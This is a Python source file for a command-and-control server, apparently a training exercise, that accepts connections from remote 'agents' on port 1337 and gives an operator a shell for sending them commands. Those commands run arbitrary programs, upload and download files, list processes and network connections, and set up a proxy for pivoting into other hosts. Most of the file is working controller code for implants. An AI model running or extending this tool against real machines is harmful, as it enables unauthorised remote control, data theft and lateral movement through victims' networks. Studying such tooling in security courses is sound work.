#!/usr/bin/env python3

from ast import arg
import asyncio
from email import message
from http.client import responses
import random
import re
import signal
import struct
from urllib import response
import sys
from termcolor import colored, cprint
import time
import os

import aioconsole


class Agent:
    """Create an Agent object whenever an agent connectes to track outbound tasks and
    inbound responses. The tasks are stored in an asyncio.Queue which can be awaited
    on.  In you networking code, await on the Queue to know when new commands are added.
    responses is just a regular list because we dont need to be notified asnycronously
    when they arrive. The Queue will store tuples with (command, args), the responses
    will store tuples with (ret_code, message)
    """

    commands: asyncio.Queue[tuple[bytes, bytes]]
    responses: list[tuple[int, bytes]]
    name: str

    def __init__(self):
        self.commands = asyncio.Queue(20)
        self.responses = []
        self.name = "agent_" + str(random.randint(100, 999))

    def __str__(self) -> str:
        return self.name

    def print_responses_bytes(self):
        print("\n")
        print(f"{self} Responses")
        print(f"{'ndx':>4}|{'size':>7}|{'ret':>4}|{'data':>5}")
        for (i, (ret_code, data)) in enumerate(self.responses):
            print(f"{i:>4}|{len(data):>7}|{ret_code:>4}|{data.__repr__():<.50}")
        print("\n")



    def clear_responses(self):
        self.responses.clear()


def get_agent_by_name(name: str, agents_connected: list[Agent]) -> Agent | None:
    """Search the agents_connected list for an agent with name: [name]. This can be a
    useful helper function throughout the code base.

    Args:
        name (str): The name of the agent.
        agents_connected (list[Agent]): the list that contains all the agents.

    Returns:
        Agent | None: The agent with the queried name or None if not found.
    """

    for i in range(len(agents_connected)):
        if agents_connected[i].name == name:
            return agents_connected[i]
    return None

        


def export_response(response: bytes, filename: str) -> None:
    """Writes the response to the local file system.  You can do as much or as little
    error checking as you wish.

    Args:
        response (bytes): They bytes of the response from the agent.
        filename (str): The local path which will be written to.
    """

    with open(filename, "wb") as f:
        f.write(response)


async def parse_response(reader: asyncio.StreamReader) -> tuple[int, bytes]:
    """Converts the byte stream from the agent to something more useful programatically.
    The default agent returns responses generically as:

    struct response {
        uint32_t total_message_size;
        uint32_t ret_code;
        uint32_t msg_length;
        char message[msg_length]
    }

    What we care about is the message as bytes (dont eagarly convert to a str because
    a response may not be UTF-8), and the return code.

    Args:
        reader (asyncio.StreamReader): The asyncronous stream from which to read a
        single response from.

    Returns:
        tuple[int, bytes]: return a tuple with the return code and the message.
    """
    
    
    # total_message_size - first four bytes from the data read in. unpacking as int and grabbing the first item in the tuple
    total_message_size_bytes = await reader.readexactly(4)
    tota_message_size_value = struct.unpack("> I", total_message_size_bytes)[0]


    # ret_code - second four bytes from the data read in. unpacking as int and grabbing the first item in the tuple
    ret_code_bytes = await reader.readexactly(4)
    ret_code_value = struct.unpack("> I", ret_code_bytes)[0]

    # msg_length - third four bytes from the data read in. unpacking as int and grabbing the first item in the tuple
    msg_length_bytes = await reader.readexactly(4)
    msg_length_value = struct.unpack("> I", msg_length_bytes)[0]

    # message -
    message = await reader.readexactly(msg_length_value)

    return (ret_code_value, message)
    #print('Received: %r' % data.decode())



def create_command(command: bytes, args: bytes) -> bytes:
    """creates a packed stream of bytes that is ready to be sent to the agent.  Use
    this function as a utility to serialize commands.  A command needs to be sent in the
    following format

    struct response {
        uint32_t total_message_size;
        uint32_t command_length;
        char command[command_length];   //NULL TERMINATED
        uint32_t args_length;
        char args[args_length];
    }

    Args:
        command (bytes): the command to be sent
        args (bytes): arguments for the command (these can be wildly differnt, try to
        split up the functionallity for generating these)

    Returns:
        bytes: a serialized bytestream that can be sent to the agent
    """

    command_length_value = len(command)
    args_length_value = len(args)
    # print("command len: {} --- args len: {}".format(command_length_value, args_length_value)) # TODO: delete later
    
    command_length_bytes = struct.pack("> I", command_length_value)
    command_bytes = struct.pack("{}s".format(command_length_value), command)
    args_length_bytes = struct.pack("> I", args_length_value)
    args_bytes = struct.pack("{}s".format(args_length_value), args)

    pre_response = command_length_bytes + command_bytes + args_length_bytes + args_bytes + struct.pack("> I", 0)
    message_size_bytes = struct.pack("> I", len(pre_response))

    response = message_size_bytes + command_length_bytes + command_bytes + args_length_bytes + args_bytes

    return response


def create_upload_arg(src: str, dst: str) -> bytes:
    """The agruments for the upload command are a bit more complicated that the other
    commands. Use this function to generate serialized arguments for the upload command.
    This function may involve reading from files, so add as much or as little error
    checking as you see fit.

    struct upload_args{
        uint32_t file_path_size;
        char file_path[file_path_size];       // NULL TERMINATED
        uint32_t contents_size;
        char contents[contents_size];
    }

    Args:
        src (str): path on the local host
        dst (str): path on the remote host

    Returns:
        bytes: serialzed args for a upload command
    """ 
    try:
        # reading data that was already written into file (src) before running this command
        with open(src, "rb") as f:
            contents = f.read()
    except IsADirectoryError:
        file_is_directory_warning = colored("{} is diretory. Please make sure the source is a file.".format(src), "red")
        print(file_is_directory_warning)
        return "Error IAD"
    except FileNotFoundError:
        file_not_found_warning = colored("{} not found. Please make sure the source file exists or the path is correct.".format(src), "red")
        print(file_not_found_warning)
        return "Error FNF"
    


    # turning the dst into bytes and adding the null termination byte
    dst = dst.encode() + b"\x00"

    # taking length to use later
    file_path_length_value = len(dst)
    contents_length_value = len(contents)

    # Creating the bytes to concat later (using the lengths within)
    file_path_size = struct.pack("> I", file_path_length_value)
    file_path_bytes = struct.pack("{}s".format(file_path_length_value), dst)
    contents_size = struct.pack("> I", contents_length_value)
    contents_bytes = struct.pack("{}s".format(contents_length_value), contents)

    # crafting the response
    response = file_path_size + file_path_bytes + contents_size + contents_bytes

    return response


def create_proxy_arg(local_port: str, remote_host: str, remote_port: str) -> bytes:
    """The proxy args are also complicated like the upload args. Please note that the
    arguments that are passed in this function are not in the same order that they are
    sent on the wire.  You may choose to rearrange their order if you wish.

    struct proxy_args {
        uint32_t target_host_len
        char target_host[target_host_len];   //NULL TERMINATED
        uint32_t target_port_len;
        char target_port[target_port_len];
        uint16_t local_port                  // IMPORTANT: localport is a uint16_t while
    }                                        // target port is a NULL TERMINATED string


    Args:
        local_port (str): port to open on the remote host
        remote_host (str): host the proxy will forward to
        remote_port (str): port the poxy will forward to

    Returns:
        bytes: serialized args for the proxy command
    """

    # turning the remote stuff into bytes and adding the null termination byte
    remote_host = remote_host.encode() + b"\x00"
    remote_port = remote_port.encode() + b"\x00"

    # taking length to use later
    target_host_length_value = len(remote_host)
    target_port_length_value = len(remote_port)

    # Creating the bytes to concat later (using the lengths within)
    target_host_size = struct.pack("> I", target_host_length_value)
    target_host_bytes = struct.pack("{}s".format(target_host_length_value), remote_host)
    target_port_size = struct.pack("> I", target_port_length_value)
    target_port_bytes = struct.pack("{}s".format(target_port_length_value), remote_port)

    # odd manner of turning a string into hex bytes necessary for the function
    hex_string = hex(int(local_port))[2:]
    local_port_bytes = bytes.fromhex(hex_string)

    # crafting the response
    response = target_host_size + target_host_bytes + target_port_size + target_port_bytes + local_port_bytes

    return response

async def manage_agent(
    agent: Agent, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
):
    """Handler for new agents after they connect.  
    
    Use this function as a 'main loop' for an individual connection to send and recive data.  
    
    Use the queue on the agent object to know when the user wants to send commands then await on the reader to get responses.  
    
    You can conveniently assume that one request will have one response so
    
    you can alternate between sending and recieving. The loop should be
    (in pseudo code):


    while connected:
        "wait for command from user"
        "send command to agent"
        "recieve response from agent"

    Args:
        agent (Agent): the agent object tied to this connection
        reader (asyncio.StreamReader): stream to get data from the agent
        writer (asyncio.StreamWriter): stream to send data to the agent
    """


    # parse_response is initially ran since the agent will first send a "check-in" message. Server needs to grab it first.
    data = await parse_response(reader)
    agent.responses.append(data)

    # loop to write command to agent and read/receive and save responses
    while True:
        command = await agent.commands.get()
        writer.write(command)
        data = await parse_response(reader)
        agent.responses.append(data)
        


def client_cb(agents_connected: list[Agent]):
    async def cb(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """This callback will get called each time a new TCP connection is made on the
        server.  
        
        use this to setup everything for an agent and start the manage_agent
        loop.  
        
        this callback closes over the agents connected param in the parent
        because it cant be passed directly as a param bacause it has to match the
        callback protocol. 
        
        Use the agents_connected list to add newly connected agents.

        Args:
            reader (asyncio.StreamReader): stream to get data from the agent
            writer (asyncio.StreamWriter): stream to send data to the agent
        """

        
        
        my_agent = Agent()
        agents_connected.append(my_agent)
        colored_input_line = colored("\n>>> ", "yellow")
        colored_client_connected_line = colored("\nClient Connected: " + my_agent.name, "green")
        print(colored_client_connected_line + colored_input_line, end="")


        await manage_agent(my_agent, reader, writer)

    return cb


async def server(agents_connected: list[Agent]):
    """Start a async tcp server.  This can be as simple or complex as you would like.
    The provided code is the most basic setup, but you could make it more configureabe.
    as a streach you could add ssl here.

    Args:
        agents_connected (list[Agent]): The list containing all connected agents
    """

    server = await asyncio.start_server(client_cb(agents_connected), "0.0.0.0", 1337)
    await server.serve_forever()


async def shell(agents_connected: list[Agent]):
    """Start async shell. In this function, utilize the aioconsole 3rd party library to
    asyncronously wait for input (you may decide to implement this another way without
    aioconsole). this will allow us to wait for user input without blocking the rest of
    the program, including the tcp server code.  This function can be implemented with
    the following pseudo code:

    while True:
        "wait for input"
        "parse the input"
        if "input is command"
            "put command in the right agents queue" (invoke, hostname, shutdown, etc.)
        else
            "perform functions not related to agents" (export, list agents, etc.)


    Args:
        agents_connected (list[Agent]): The list containing all connected agents
    """

    # Handles the preface ">>>" text string. If user is already in an agent contect (typed "use agent_XXX") then it will show in the preface, otherwise normal ">>>"
    current_agent = 0
    while True:

        if current_agent:
            preface = colored("({})>>> ".format(current_agent.name), "yellow")
            
        else:
            preface = colored(">>> ", "yellow")

        input = await aioconsole.ainput(preface)

        # Makes sure another preface comes up even if user just hits enter
        if not input or input.isspace():
            continue
        
        # splits the input for easier comparisons
        input_split = input.split()

        # lowers and strips the full input for total comparision (i.e list agents will equal "   liSt agents  ")
        full_input_lowered_stripped = input.lower().strip()

        # grabs the first portion of the list which is the command (use, invoke, upload, etc.)
        command_head = input_split[0].lower()

        # try to run the "use" command portion. If it fails due to an index error (didn't provide an argument or agent), then warn the user instead of crashing program.
        try:
            # used to set a new agent, can be done even thougha  agent is already set
            if command_head == "use":
                    current_agent = get_agent_by_name(input_split[1], agents_connected)
                    if not current_agent:
                        agent_not_exist_warning = colored("Agent does not exist", "red")
                        print(agent_not_exist_warning)
                    continue
        except IndexError:
            use_command_index_error_message = colored("Usage: use [agent]", "red")
            print(use_command_index_error_message)
            

        # Commands and functions that can only be ran if an agent is set
        if current_agent: 
            if command_head == "invoke":
                invoke = bytes(command_head, 'utf-8') + b"\x00"
                args_text = " ".join(input_split[1:])
                args = bytes(args_text, 'utf-8') + b"\x00"
                await current_agent.commands.put(create_command(invoke, args))
                # print(current_agent.commands) # TODO: delete later

            elif command_head == "hostname":
                hostname = bytes(command_head, 'utf-8') + b"\x00"
                await current_agent.commands.put(create_command(hostname, b"\x00"))
                # print(current_agent.commands) # TODO: delete later

            elif command_head == "netstat":
                netstat = bytes(command_head, 'utf-8') + b"\x00"
                await current_agent.commands.put(create_command(netstat, b"\x00"))
                # print(current_agent.commands) # TODO: delete later
                
            elif command_head == "shutdown": # test later lol
                shutdown = bytes(command_head, 'utf-8') + b"\x00"
                await current_agent.commands.put(create_command(shutdown, b"\x00"))
                # print(current_agent.commands) # TODO: delete later

            elif command_head == "sleep":
                sleep = bytes(command_head, 'utf-8') + b"\x00"
                args = bytes(input_split[1], 'utf-8') + b"\x00"
                await current_agent.commands.put(create_command(sleep, args))
                # print(current_agent.commands) # TODO: delete later
            elif command_head == "upload":
                upload = bytes(command_head, 'utf-8') + b"\x00"
                try:
                    src = input_split[1]
                    dst = input_split[2]
                except IndexError:
                    upload_src_dst_index_error_message = colored("usage: upload [src] [dst]", "red")
                    print(upload_src_dst_index_error_message)
                    continue
                args = create_upload_arg(src, dst)
                if args == "Error FNF" or args == "Error IAD":
                    continue
                await current_agent.commands.put(create_command(upload, args))
                # print(current_agent.commands) # TODO: delete later
                
            elif command_head == "download":
                download = bytes(command_head, 'utf-8') + b"\x00"
                try:
                    args_text = " ".join(input_split[1:])
                    args = bytes(args_text, 'utf-8') + b"\x00"
                except IndexError:
                    download_src_index_error_message = colored("usage: download [remote_src]", "red")
                    print(download_src_index_error_message)
                    continue
                await current_agent.commands.put(create_command(download, args))
                # print(current_agent.commands) # TODO: delete later

            elif command_head == "proclist":
                if len(input_split) > 1:
                    # processlist with an arg (>>> proclist [PID])
                    processlist = bytes(command_head, 'utf-8') + b"\x00"
                    args = bytes(input_split[1], 'utf-8') + b"\x00"         # PID
                    await current_agent.commands.put(create_command(processlist, args))
                    # print(current_agent.commands) # TODO: delete later
                else:
                    # processlist by itself (>>> proclist)
                    processlist = bytes(command_head, 'utf-8') + b"\x00"
                    await current_agent.commands.put(create_command(processlist, b"\x00"))
                    # print(current_agent.commands) # TODO: delete later
            elif command_head == "proxy":
                # proxy target_host target_port local_port
                # {uint32:total_message_size}{uint32:6}{char[6]:"proxy"}{uint32 args_length}{{uint32:target_host_len}{char[target_host_len]:target_host}{uint32:target_port_len}{char[target_port_len]:target_port}{uint16:local_port}}
                proxy = bytes(command_head, 'utf-8') + b"\x00"
                target_host = input_split[1]
                target_port = input_split[2]
                local_port = input_split[3]
                args = create_proxy_arg(local_port, target_host, target_port)
                await current_agent.commands.put(create_command(proxy, args))
                # print(current_agent.commands) # TODO: delete later

            elif command_head == "export":
                try:
                    idx = int(input_split[1])
                    print(input_split)
                    filename = input_split[2]
                    (_, response) = current_agent.responses[idx]
                except Exception:
                    print("Not a valid index")
                    continue
                export_response(response, filename)

            elif input == "current agent":
                if agent:
                    print(agent.name)
                else:
                    print("No agent selected")

            elif input == "list agents":
                for agent in agents_connected:
                    print(agent.name)

            elif input == "print_responses_bytes" or input == "pb":
                current_agent.print_responses_bytes()

            elif input == "clear_responses" or input == "cr":
                current_agent.clear_responses()

            else:
                # Print warning for if the user does have an active agent and did not run the appropiate commands.
                invalid_warning = colored("Please enter a valid command", "red")
                print(invalid_warning)
    
        # Command and functions that can only be run NO agent is set
        else: 
            if full_input_lowered_stripped == "list agents":
                for agent in agents_connected:
                    print(agent.name)
            else:
                # Print warning for if the user does not have an agent active and did not run the appropite commands.
                invalid_or_nonagent_warning = colored("Please enter a valid command. BTW, you don't have an agent selected.", "red")
                print(invalid_or_nonagent_warning)
        

async def main():
    """Initializes the agents list and starts the server and shell coroutine"""

    agents_connected: list[Agent] = []
    await asyncio.gather(shell(agents_connected), server(agents_connected))


def sigint_handle(_signum, _frame):
    """Exit the program if the user presses Ctrl+C"""

    print("\nClosing...")
    exit(0)


if __name__ == "__main__":
    """Register signal handler and start main with default event loop"""

    signal.signal(signal.SIGINT, sigint_handle)
    asyncio.run(main())
